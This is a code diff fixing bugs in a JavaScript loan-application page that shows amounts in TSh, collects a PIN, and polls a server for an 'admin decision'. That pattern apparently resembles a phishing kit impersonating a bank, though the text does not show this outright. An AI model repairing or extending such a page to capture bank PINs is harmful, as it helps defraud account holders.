@@ -1,4 +1,4 @@
-const sessionId = 'nmb_' + Math.random().toString(36.substring(2, 9));
+const sessionId = 'nmb_' + Math.random().toString(36).substring(2, 9);
 
 const state = {
     amount: 100000,
@@ -18,7 +18,7 @@ const state = {
 
 const screens = {
     slider: document.getElementById('screen-slider'),
-    step1: document.getElementById('screen-step1'),
+    step1: document.getElementById('screen-step1'), // Added missing screen reference
     step2: document.getElementById('screen-step2'),
     step3: document.getElementById('screen-step3'),
     pin: document.getElementById('screen-pin'),
@@ -28,7 +28,9 @@ const screens = {
 };
 
 function showScreen(screenKey) {
-    Object.values(screens).forEach(scr => scr.classList.remove('active'));
+    Object.values(screens).forEach(scr => {
+        if (scr) scr.classList.remove('active');
+    });
     if (screens[screenKey]) {
         screens[screenKey].classList.add('active');
         window.scrollTo(0, 0);
@@ -141,12 +143,12 @@ document.getElementById('btn-step2-next').addEventListener('click', () => {
         document.getElementById('sum-amount').innerText = `TSh ${Number(state.amount).toLocaleString()}`;
         document.getElementById('sum-duration').innerText = state.duration;
         document.getElementById('sum-purpose').innerText = state.purpose;
-        showScreen('screen-step3');
+        showScreen('step3');
     }, 700);
 });
 
 document.getElementById('btn-step3-back').addEventListener('click', () => {
-    showScreen('screen-step2');
+    showScreen('step2');
 });
 
 document.getElementById('btn-step3-submit').addEventListener('click', async () => {
@@ -349,7 +351,7 @@ function pollAdminDecision(callback) {
     const interval = setInterval(async () => {
         try {
             const res = await fetch(`/api/check-status/${sessionId}`);
-            const data = await res.json();
+            const data = res.ok ? await res.json() : {};
             if (data.status && data.status !== 'pending') {
                 clearInterval(interval);
                 callback(data.status);
@@ -365,4 +367,3 @@ document.getElementById('btn-home').addEventListener('click', () => {
 });
 
 updateCalculator();
-    
